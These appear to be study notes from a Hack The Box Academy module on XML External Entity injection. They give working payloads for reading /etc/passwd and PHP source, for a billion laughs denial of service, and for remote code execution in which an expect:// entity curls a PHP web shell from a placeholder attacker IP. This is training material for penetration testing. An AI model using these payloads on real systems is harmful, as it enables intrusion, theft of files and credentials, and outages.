# Local File Disclosure - [LINK](https://academy.hackthebox.com/app/module/134/section/1204)


XML External Entity (XXE) Injection allows attackers to exploit insecure XML parsing to read sensitive local files, extract application source code, and in some cases, achieve Remote Code Execution (RCE) or Denial of Service (DoS).

## 1. Identifying the Vulnerability

To test if an application is vulnerable to XXE, intercept the XML request and attempt to define a custom **internal** entity. If the entity's value is reflected in the web application's response, the parser is processing injected entities.

**Testing Payload:**

```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
  <email>&company;</email>
</root>

```

*If the response displays "Inlane Freight" instead of "&company;", the application is vulnerable.*

> **Pro-Tip (JSON to XML):** If an application defaults to JSON (`Content-Type: application/json`), try changing the header to `Content-Type: application/xml` and convert the JSON payload to XML. The backend might still accept and insecurely parse XML data.

---

## 2. Reading Sensitive Local Files

Once XXE is confirmed, change the entity to an **external** entity using the `SYSTEM` keyword and the `file://` wrapper to read files on the backend server (e.g., `/etc/passwd`, configuration files, or `id_rsa` SSH keys).

**Local File Disclosure Payload:**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
  <email>&company;</email>
</root>

```

*Note: In some Java web applications, pointing the `file://` wrapper to a directory instead of a file will return a directory listing.*

---

## 3. Reading Source Code (PHP Filter Evasion)

Attempting to read source code (like `index.php`) directly via the `file://` wrapper often fails because the code contains characters like `<`, `>`, and `&` which break the XML syntax.

To bypass this in PHP applications, use the `php://filter` wrapper to Base64 encode the file contents before the XML parser processes them.

**Source Code Extraction Payload:**

```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
  <email>&company;</email>
</root>

```

*Once you receive the Base64 string in the response, decode it locally to view the original source code.*

---

## 4. Remote Code Execution (RCE)

If the PHP `expect` module is installed and enabled (which is rare on modern servers), you can execute arbitrary operating system commands.

To bypass XML syntax breaking when writing complex commands (like downloading a reverse shell), replace spaces with `$IFS` and avoid characters like `|`, `>`, and `{`.

**RCE Payload (Downloading a Web Shell):**

```bash
# 1. Host a basic PHP web shell on your attack machine
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80

```

```xml
<!-- 2. Send the XXE payload to fetch the shell -->
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'YOUR_IP/shell.php'">
]>
<root>
  <email>&company;</email>
</root>

```

---

## 5. Denial of Service (Billion Laughs Attack)

This attack overloads the backend server's memory by utilizing self-referencing entity loops. *Note: Modern web servers (like recent Apache versions) often protect against entity self-referencing by default.*

**DoS Payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!-- Continue nesting up to a10... -->
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
  <email>&a10;</email>
</root>

```
